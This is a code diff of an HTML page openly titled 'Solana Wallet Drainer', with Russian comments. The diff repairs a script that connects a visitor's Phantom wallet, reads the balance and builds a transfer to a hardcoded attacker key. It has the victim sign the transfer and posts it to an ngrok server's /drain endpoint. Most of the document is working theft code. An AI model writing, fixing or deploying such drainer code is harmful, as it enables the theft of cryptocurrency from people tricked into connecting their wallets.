@@ -37,30 +37,41 @@
         <h1>Solana Wallet Drainer</h1>
         <button id="connect-wallet">Подключить кошелек</button>
     </div>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.30.2/lib/index.umd.min.js"></script>
+    <!-- Используем самый последний SDK -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
-        // Дождемся загрузки библиотеки
-        document.addEventListener('DOMContentLoaded', () => {
-            // Объявляем переменные непосредственно из window.solanaWeb3
-            const Connection = solanaWeb3.Connection;
-            const PublicKey = solanaWeb3.PublicKey;
-            const SystemProgram = solanaWeb3.SystemProgram;
-            const Transaction = solanaWeb3.Transaction;
+        // Дождемся полной загрузки страницы
+        window.addEventListener('load', () => {
+            console.log('Page loaded!');
             
-            const connection = new Connection('https://api.mainnet-beta.solana.com');
+            // Проверим доступные глобальные объекты
+            console.log('Window objects:', Object.keys(window).filter(k => k.includes('solana')));
+            
+            // Библиотека создает глобальный объект solanaWeb3
+            if (window.solanaWeb3) {
+                console.log('Solana Web3 loaded successfully');
+            } else {
+                console.error('Solana Web3 not found in window object!');
+            }
+            
+            // Используем объекты из глобального пространства
+            const connection = new window.solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
             
             document.getElementById('connect-wallet').addEventListener('click', async () => {
                 console.log('Button clicked');
+                
+                // Проверяем, установлен ли Phantom
                 if (window.solana && window.solana.isPhantom) {
                     try {
-                        console.log('Connecting to Phantom wallet...');
-                        // Request to connect to the wallet
+                        console.log('Phantom detected, connecting...');
+                        
+                        // Подключаемся к кошельку
                         const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
                         const publicKey = connectResponse.publicKey;
                         console.log(`Connected to wallet: ${publicKey.toString()}`);
                         alert(`Connected to wallet: ${publicKey.toString()}`);
                         
-                        // Proceed with draining the wallet
+                        // Получаем баланс
                         console.log('Getting balance...');
                         const balance = await connection.getBalance(publicKey);
                         console.log(`Balance: ${balance} lamports`);
@@ -72,10 +83,10 @@
                         
                         console.log('Creating transaction...');
                         // Замените на реальный публичный ключ получателя
-                        const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
+                        const drainerPubkey = new window.solanaWeb3.PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
                         
-                        const transaction = new Transaction().add(
-                            SystemProgram.transfer({
+                        const transaction = new window.solanaWeb3.Transaction().add(
+                            window.solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: publicKey,
                                 toPubkey: drainerPubkey,
                                 lamports: lamportsToSend,
@@ -89,8 +100,13 @@
                         
                         console.log('Signing transaction...');
                         const signedTransaction = await window.solana.signTransaction(transaction);
+                        console.log('Transaction signed');
                         
-                        console.log('Sending transaction to server...');
+                        // Правильно сериализуем транзакцию
+                        const serializedTransaction = signedTransaction.serialize();
+                        const base64Transaction = Buffer.from(serializedTransaction).toString('base64');
+                        
+                        console.log('Sending to server...');
                         // Отправка на сервер
                         const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
                             method: 'POST',
@@ -98,9 +114,11 @@
                                 'Content-Type': 'application/json'
                             },
                             body: JSON.stringify({ 
-                                signedTransaction: Array.from(signedTransaction.serialize()).toString() 
+                                signedTransaction: base64Transaction
                             })
                         });
+                        
+                        console.log('Server response status:', serverResponse.status);
                         
                         if (!serverResponse.ok) {
                             const errorText = await serverResponse.text();
@@ -108,6 +126,7 @@
                         }
                         
                         const result = await serverResponse.json();
+                        console.log('Success response:', result);
                         alert('Transaction sent: ' + result.signature);
                         
                     } catch (err) {
